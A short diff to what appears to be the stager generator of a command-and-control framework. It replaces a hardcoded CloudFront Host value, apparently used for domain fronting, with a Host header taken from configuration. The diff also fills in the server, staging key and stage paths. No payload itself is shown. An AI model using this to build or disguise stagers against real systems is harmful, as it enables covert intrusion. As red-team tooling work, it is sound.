@@ -106,8 +106,12 @@ class Stagers:
         # patch the server and key information
         stager = stager.replace("REPLACE_SERVER", server)
         stager = stager.replace("REPLACE_STAGING_KEY", key)
-        # check if host header is within the additional headers, and add it if so. same for _hop
-        stager = stager.replace("REPLACE_HOST", "d1dqfbim5iow53.cloudfront.net")
+        hosth = ""
+        if self.headers:
+            for h in headers:
+                if 'Host' in h:
+                    hosth = h[1]
+        stager = stager.replace("REPLACE_HOST", hosth)
         stager = stager.replace("index.jsp", self.stage1)
         stager = stager.replace("index.php", self.stage2)
 
@@ -148,6 +152,12 @@ class Stagers:
         # patch the server and key information
         stager = stager.replace("REPLACE_SERVER", server)
         stager = stager.replace("REPLACE_STAGING_KEY", key)
+        hosth = ""
+        if self.headers:
+            for h in headers:
+                if 'Host' in h:
+                    hosth = h[1]
+        stager = stager.replace("REPLACE_HOST", hosth)
         stager = stager.replace("index.jsp", self.stage1)
         stager = stager.replace("index.php", self.stage2)
 
